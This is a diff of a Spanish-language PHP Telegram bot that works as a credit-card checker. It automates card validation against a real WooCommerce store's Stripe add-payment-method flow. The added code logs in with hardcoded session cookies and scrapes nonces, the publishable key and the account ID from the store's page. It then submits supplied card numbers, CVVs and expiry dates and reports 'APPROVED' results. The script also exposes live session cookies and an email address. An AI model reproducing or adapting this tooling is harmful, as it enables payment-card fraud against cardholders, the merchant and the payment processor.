@@ -233,7 +233,6 @@ $admin = "<a href='t.me/rigo_jz'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>";
 
 
 
-
 /*
 $chat_id = "1292171163";
 $id = "1292171163";
@@ -241,10 +240,10 @@ $id = "1292171163";
 echo "TU CCS: ";
 $data = trim(fgets(STDIN));
 $message = "!".$data."";
-*/
+
 ///----+------------------------
 
-
+*/
 
 if ($myid == $id) {
   $tipo = "ᴀᴅᴍɪɴ";
@@ -1524,15 +1523,56 @@ die();
 $respuesta = "<b>🕒 Wait for Result...</b>";
 sendMessage($chat_id,$respuesta, $message_id);
 //-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
-//$id_text = file_get_contents("ID");
+$id_text = file_get_contents("ID");
 //----------------------------------------------------//
 
 
 $startTime = microtime(true); //TIEMPO DE INICIO
 $BinData = BinData($bin); //Extrae los datos del bin
 
-///se ingresa los datos//
-$nonce = "9e1a2b021e";
+
+
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://dream-beat.com/my-account/add-payment-method/',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_COOKIE => 'wordpress_logged_in_16be603727c326eebbb2512f82748386=rigoj777%7C1727365195%7C4zf5xzJfSKsZLQfpKAvQALvRES9qQYwgCPRR6nXKKh9%7C3b57db40d69d43229f38fb563c6d0c7d3c2d6cee57d85f3b0ea1b9ae544b543b; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-12%2015%3A45%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-09-12%2015%3A45%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fadd-payment-method%2F',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
+//    'Accept-Encoding: gzip, deflate, br, zstd',
+    'accept-language: es-US,es;q=0.8',
+    'referer: https://dream-beat.com/my-account/payment-methods/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+
+curl_close($curl);
+
+$partes = explode('"createSetupIntentNonce":"', $response);
+$nonce = explode('"', $partes[1]);
+$nonce = $nonce[0];
+//    echo "Nonce: $nonce\n";
+
+$partes = explode('"publishableKey":"', $response);
+$pk_live = explode('"', $partes[1]);
+$pk_live = $pk_live[0];
+//    echo "PK Live: $pk_live\n";
+
+
+$partes = explode('"accountId":"', $response);
+$accountId = explode('"', $partes[1]);
+$accountId = $accountId[0];
+//    echo "Account ID: $accountId\n";
+
+
 $curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
@@ -1542,15 +1582,14 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'billing_details%5Bname%5D=+&billing_details%5Bemail%5D=gopejob932%40ndiety.com&billing_details%5Baddress%5D%5Bcountry%5D=US&billing_details%5Baddress%5D%5Bpostal_code%5D=14013&type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F088e2e9be8%3B+stripe-js-v3%2F088e2e9be8%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fdream-beat.com&time_on_page=23535&client_attribution_metadata%5Bclient_session_id%5D=50fb581c-8f85-480e-a266-532f08cb8f68&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=NA&muid=2bdc84e4-ad2e-4888-8cfc-f124e2a32c200a5349&sid=b1c8f27b-3c95-49df-97ef-e8b03cb64814a500f1&key=pk_live_iBIpeqzKOOx2Y8PFCRBfyMU000Q7xVG4Sn&_stripe_account=acct_1OK6stFv0vmKZcjv&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiNzQwUExKTDhtMzMxZTJYWHdkdWRVRGFYaERlTnFvMC95a2FhSDUwL1NLY2NYbEdhVGlQdjlYRzk2VkdtZDByOTVtY1VFOE9rYXRLVERtUTVZOHdMcEV5b1BKWDlka3lEYUdnOUJqYTFRZ0wrRHU4V2F4SEJYdG5kZHZQeXN1ckxQU01BdnUrS0lrVHEwQ3ovZGFKNFZKMEExS3dUVE5UV081WW1jZVNxK0R2TlhmUFovT0hHMllCbXhYTGpDQU9VWGtXT2JOV0E5aSt2Q3BCM01YdGwwREk5T2tORnlLWVM1bVlIVFl4MFlDMnRCbkowbHhDME56aGQ1ZzlqWkxGZGtNYittWkNZTlhESmhVVnY0TVRJTkhldlBYSnBialp2UVJSTVorWUp2cmJKZ2pKcDlZbjFDK2MvZUx2aDhXUWZoOVNrZEFmK2JXVG9nVkpYVlE1VTdjcE8weWZQM1ZGYjIvY2MzQ2ZETHQwcFZVTWl5d0xHb0s4dnlLT3Mwd1pBUXgvWUVYbG91a0p6YjNnYzl3UzRJZDJvM1BEMDY2UlBlTjRRQW9ydVVFbHJEekJxMU9nellOZUpNT3RualZ0TW5DdXg2emdJTXRsMVRmUUQ5bldjRjl4RFpkaklwTWtsVzJxeXE5SC9LZ3g3dnBqQWh2bnJsWi9yWXJJcWFKc0FFWkJLSUNVci9KLy9xL0VjZ1ZXR1Y0d2xNZHJ3N0MyOW5OUkYza1dnbk5SU0V4a29vdHoycGNRcDk2K2pnc2w2QzBZeHcxbDJwekdZaHcxaFVMWEljRWZKbW4xUWYxYmhXZVN2UjdOZjluSi9jUS93Y1RiMHhKME04QUs1cHhMcU9LUWxKVFVtaHlMYVFPMmhvS1hwOGJVWm8rNUhhUlFpWURVUlA0OHR3RE0xQVVtOThjdnlHMFJzMGxvREhyRE5nMkpqODJ6cVNOTHozSE5Pa0JqQWNTRkxyc1Y5TkhUVmRBQ0diRFFuMkhjQ2ZYQ0Yvam9WSkxMZ3J4Sml6OXppd3pRS0xJTzd3dGZHd3ZmVDYwV3NmSE1veFYybSszV2piM1ArREp0eFUvdldtMlpNRHMvd1hyMVZJSG9Hc012KzN1N0tNN2FweXlPZEhXM2tFeGJWeFdYckpoY0R6RFlmeGNZMmJzV2NBaDlMMDNDdnlJa1M2UWJ2SE9zYitpbHJOenArV09IUlFlY1VrQldJT1Q5emdmR2hnZTRydml0SytVZUhaSE5VWVRyWkdBMXorN3Z0UWpEUytyZE43eHVQRm5FTGpQTEp4L0JhR21jUXNudzJvKzBpMHRDbFE0UjA4akN1MGVQTFZsNHZiVzd6YnVyY2Y0S1FIbDBQaGZkbG9lcjFFMHk3UlB4LytPay9tSHAxaXFkdjVMY2E1dDFYWkVYaTZ5V2xNZGs2RGlKNUZuNm9OK2lhcU9uaGxnMlpTMWFVcjBKT0c4VGMveWlNU21RdTRXemlnMHpNYysva2hOTmZYY2pEeHdXZERuQ2pwcG5ZdDk3K04waG1VYWdRZG5RcnRzcUgrbzQ0V291dHVVb0tCajBCa09oWDBGUXQzNWhLeDdMY3VoM1RMZW1EUDJhaXFDYmhjWTAxNHJ1eDlVQWN6Z3d6M3RDbUtqb0RCL2JhVFA2V1c1ci9MWXlJVG9YREtsMmVqTnRMUlZBeHZaMEp5cmMxbWlTZGJLV0JQalZ3SWlmcVNuYnJTaW45ZU0zenhzaWhsQ0xZK2dvSGwwOGZiOGFsbnBReHNIbUZyaDViZEhnUm1HTzQ4MTFnRWdkUWd4d1NDMXZEa2RtVkpnTXFDT2ZyWGxETjM5K2NRR0tScDNkajFpNXl4NFl4Tkl6SmVWVnVRQ0ZtcHZiRmFxbithaFI0VllrdDV6akFBNStsUjQxckpUcUR4aUZ2YllOckM1bXgxL0tkNmRXRnFSUEtHMXFFaVRGcFlOWkZBbFc4VFZqelVJYnVQSGQwc3l2dGhKRmVRZUZ1VWtRektHTHBLbkFSQkJaeGNSTmt0NXZLQkJYTDFRSkV0SVVLbmd6Q3pteWYrK3BPV0o2TnNLVHdJVkhXdUlsb3k3dzUzMllON2tLOG9TNVB1bThFelg3emdpYUNoeFQ5Q000eWY5bXVJeEJrMU9zQjk3UDZJaUwra2w2RUdxbVladnluekJ0Vnd2NFpWclhpNTZXVEdyMXRZNUNoQVRaL1orL1I2bEhwbzVCK0kyMGVFTU5WR3MvQ2FkOWVHQkJQSlN3WEJOTm5OZnFwYThvWkNMZXhmMDh6dVpoWE1Nc0JxZDZ0UlBzZklqMUQ3K2R0V3hMa2dBWitiMmNLS1ZGRmFxTnpCVWJZZVlOVHlKMzFnWkVQMUNtb203MGdnVVpjaGZIcUxoVllpRW1xaFVkQ0Nqa2tNMGNQbWJRRlRhaTlCZklyWko0elhYMFFhb2hTb2sxNzNMYnMxU0s0Z2FNajNNUlcxYXJGVUdpWXhWSzNuclNJU2k4UFFQVjZCNnNtSGlKekwxVEpXUU5EdUpiS2lYdERTV3RESG5EUzBPZmpnRS9TZjRKNGMwbGVVOXRtS1N0N1BIZmY2UmhRMEw4aEpodlVhc05WZTUzQks3akg5bUtUbDdDQWFJMW9QeDBHL2E3YVlHYzRYZTBDay95U3Y2NGw4YnIyWEg1dkdrQURVZ3U2NzhYTUJFNXlCQlJqSnM3d1FURlZqOXR1dGRtZVpIQ2VLeEwwUDZURHRVZXJaSGNwQ3I5SGZzaE80NHBMM3ZZM21LOTYzNjVENzZrcDBwNGxnTE5GRUJkTWZOWmpyMkdIRFo4a3pzQXdWUnc5czRFV3lNd1lpa1c0UUdTc0NWeC9aZFcvbmNJPSIsImV4cCI6MTcyNTc1NDIwMCwic2hhcmRfaWQiOjgzMzQ0MDg5Nywia3IiOiI5N2U5OGQiLCJwZCI6MCwiY2RhdGEiOiJLeEpjNWJGTjQyVnRTUGtCZ2pnQWhOTGY5aXZETTR3R1FHc2dhb0dtUlFQQ2s3NlFPUzFYTjNJM1NYZEdzcytpdUdRK0EzTTJxSERST051eWJYWUhlMXFsTU5DY1FRVnBpS0JlazN4YW95eTBXenpmdnh4b1M1aHNCeG1lbWlxdFY4clJBcEN6ajhWOGJjZ21jNlFCWHlFUTJ0ZDFaRFF1UWVMN1kzMXdSRERKYzNZVlZGTHlsOEFZb2tVMUxRRTUvVG15Slc2ZWtaVmZ1UEFuIn0.PphjXF19T4yAni3YEEfWVtQWkEoWK1mzC70EQSQBXYA',
+  CURLOPT_POSTFIELDS => 'billing_details%5Bname%5D=+&billing_details%5Bemail%5D=rigoj777%40gmail.com&billing_details%5Baddress%5D%5Bcountry%5D=US&billing_details%5Baddress%5D%5Bpostal_code%5D=10001&type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&payment_user_agent=stripe.js%2Fbcadf22de5%3B+stripe-js-v3%2Fbcadf22de5%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fdream-beat.com&time_on_page=25084&client_attribution_metadata%5Bclient_session_id%5D=0e2942e8-ef40-4a97-b13d-a4f4aa04560d&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=NA&muid=0b2b11eb-7cad-40df-a9e1-ced1b24447a7658a4b&sid=NA&key='.$pk_live.'&_stripe_account='.$accountId.'',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
     'Accept: application/json',
+//    'Accept-Encoding: gzip, deflate, br, zstd',
     'Content-Type: application/x-www-form-urlencoded',
-    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
     'sec-ch-ua-platform: "Android"',
-    'sec-ch-ua-mobile: ?1',
-    'accept-language: es-US,es;q=0.7',
+    'accept-language: es-US,es;q=0.8',
     'origin: https://js.stripe.com',
     'referer: https://js.stripe.com/',
   ],
@@ -1558,14 +1597,14 @@ curl_setopt_array($curl, [
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
-
 curl_close($curl);
-
-
 $json = json_decode($response, true);
 $id = $json['id'];
 
+//echo "$id\n";
 ///Verifica la targeta///
+
+
 $curl = curl_init();
 
 curl_setopt_array($curl, [
@@ -1579,21 +1618,21 @@ curl_setopt_array($curl, [
   CURLOPT_POSTFIELDS => [
     'action' => 'create_setup_intent',
     'wcpay-payment-method' => ''.$id.'',
-    '_ajax_nonce' => '9e1a2b021e',
+    '_ajax_nonce' => ''.$nonce.'',
   ],
-  CURLOPT_COOKIE => 'wordpress_sec_16be603727c326eebbb2512f82748386=gopejob932%7C1726962022%7Cu0VQZljey6toLJkGd1ODt81VywgL2zPsqIAhWZmozQf%7Cf85e2f5868a1b24e761d0085587517131a67f011d9883c2e3a84825fd7919686; wordpress_logged_in_16be603727c326eebbb2512f82748386=gopejob932%7C1726962022%7Cu0VQZljey6toLJkGd1ODt81VywgL2zPsqIAhWZmozQf%7C3fcc99a470e631b6d6f41da7e7aa6c43082df598a050958956228487339b5d66; __stripe_mid=2bdc84e4-ad2e-4888-8cfc-f124e2a32c200a5349; __stripe_sid=b1c8f27b-3c95-49df-97ef-e8b03cb64814a500f1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-08%2000%3A05%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-09-08%2000%3A05%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fadd-payment-method%2F',
+  CURLOPT_COOKIE => 'wordpress_sec_16be603727c326eebbb2512f82748386=rigoj777%7C1727365195%7C4zf5xzJfSKsZLQfpKAvQALvRES9qQYwgCPRR6nXKKh9%7C7007d67acd788bd65648956c0ef7cd5ffb2e28c6177de5d216dcf3f543129b20; __stripe_mid=0b2b11eb-7cad-40df-a9e1-ced1b24447a7658a4b; wordpress_logged_in_16be603727c326eebbb2512f82748386=rigoj777%7C1727365195%7C4zf5xzJfSKsZLQfpKAvQALvRES9qQYwgCPRR6nXKKh9%7C3b57db40d69d43229f38fb563c6d0c7d3c2d6cee57d85f3b0ea1b9ae544b543b; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-12%2015%3A45%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-09-12%2015%3A45%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fadd-payment-method%2F',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
     'Accept-Encoding: gzip, deflate, br, zstd',
-    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
-//    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryiPbyIcSnvbv0YzNo',
+//    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
+  //  'content-type: multipart/form-data; boundary=----WebKitFormBoundarybzbH8meLO1Xw42Mf',
     'sec-ch-ua-platform: "Android"',
-    'accept-language: es-US,es;q=0.7',
+    'accept-language: es-US,es;q=0.8',
     'origin: https://dream-beat.com',
-    'sec-fetch-site: same-origin',
     'referer: https://dream-beat.com/my-account/add-payment-method/',
   ],
 ]);
+
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
@@ -1605,13 +1644,13 @@ $success = $json['success'];
 $status = $json['data']['status'];
 curl_close($curl);
 
-echo "$response\n";
+//echo "$response\n";
+
 if ($success === true && $status === "requires_action") {
     $respo = "Approved!";
 } else {
     $respo = $message;
 }
-
 
 
 $timetakeen = (microtime(true) - $startTime);
@@ -1625,7 +1664,6 @@ if (empty($respo)) {
         $respo = $response;
 }
 
-//━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."
 
 // Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
 if (array_in_string($respo, $live_array)) {
@@ -1868,6 +1906,10 @@ $respo = $matches[1];
 //--------------------------------------------------
 curl_close($curl);
 
+if (empty($respo)) {
+$respo = trim(strip_tags($data['messages']));
+
+}
 
 
 $timetakeen = (microtime(true) - $startTime);
@@ -1880,6 +1922,7 @@ $lista = "<code>".$lista."</code>";
 if (empty($respo)) {
         $respo = $response;
 }
+//echo "$respo\n";
 
 // Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
 if (array_in_string($respo, $live_array)) {
@@ -2187,7 +2230,7 @@ $nonce1 = '';
 if(preg_match('/<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="([^"]+)"/', $response, $matches)) {
 $nonce1 = $matches[1];
 }
-//echo "nonce1: $nonce1\n";
+echo "nonce1: $nonce1\n";
 
 
 //////////SE REGISTRA///////
@@ -2246,7 +2289,7 @@ preg_match('/<input type="hidden" id="woocommerce-add-payment-method-nonce" name
 $nonce2 = $matches[1] ?? null;
 
 
-//echo "nonce2 $nonce2\n";
+echo "nonce2 $nonce2\n";
 
 
 //10+%2F+30
@@ -2327,12 +2370,16 @@ $respo = $result1;
 $respo = $respo;
 }
 
+
+
 $bin = "<code>".$bin."</code>";
 $lista = "<code>".$lista."</code>";
 
 if (empty($respo)) {
         $respo = $response;
 }
+echo "$respo\n";
+
 // Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
 if (array_in_string($respo, $live_array)) {
     $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: War Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
